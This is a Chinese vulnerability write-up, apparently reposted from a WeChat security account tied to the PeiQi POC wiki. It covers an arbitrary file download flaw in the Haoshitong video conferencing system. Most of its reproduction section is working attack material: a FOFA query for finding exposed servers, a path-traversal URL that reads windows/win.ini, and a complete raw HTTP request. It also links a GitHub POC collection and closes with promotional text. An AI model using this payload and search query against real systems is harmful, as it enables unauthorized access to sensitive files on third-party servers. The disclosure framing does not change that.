> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**公众号推荐**

**这个漏洞来自于 F12sec 的师傅，大家快快关注他们啦~**

公众号

**一****：漏洞描述🐑**

**银澎云计算 好视通视频会议系统 存在任意文件下载，攻击者可以通过漏洞获取敏感信息**

**二:  漏洞影响🐇**

**银澎云计算 好视通视频会议系统**

**三:  漏洞复现🐋**

```
FOFA: app="Hanming-Video-Conferencing"
```

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3L7ee0BUTWa7icBbabrHIQGn6ZXnMEaC2rmeYeLPaQ87g0xf9nknNN5A/640?wx_fmt=png)

**漏洞 Url 为**

```
https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
```

**请求包为**  

```
GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: xxx.xxx.xxx.xxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: mldn-session-id=7950aca4-6faa-46d9-858a-97b82d619741
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3QUjjWLYt3PO1JXGtbwlLww4HgkoA907OevIULD76z8IWurXb4VpiaUw/640?wx_fmt=png)

 ****四:  Goby & POC🦉****

```
Goby & POC 已经上传到 github 的 Goby & POC 目录
https://github.com/PeiQi0/PeiQi-WIKI-POC
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3iaicXatMRKT6TYUHvt0pz8yFvOwUrP36S8d8vzlBsOqFrKcXdOEwZdsw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG368fHF3y8RSyqz9F8S30UnKUVs54HVFiayMaRZjkYqPHzmicKaZIciabmw/640?wx_fmt=png)

 ****五:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuR3NABhn2DHwpXzWABBJnA6HSjGYhvbow9iaFIXZ5IUrST4EjoHojtlg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuCFdyVD9UlKcV0COuXd5oajiacmB5LB71gLdCaEhRaiaicMTS8oq55s9pA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZu0SvJFXqSugecfEnJujNOic73ouoGndJPRvezpAstLqLJDqe6JqJsf2Q/640?wx_fmt=png)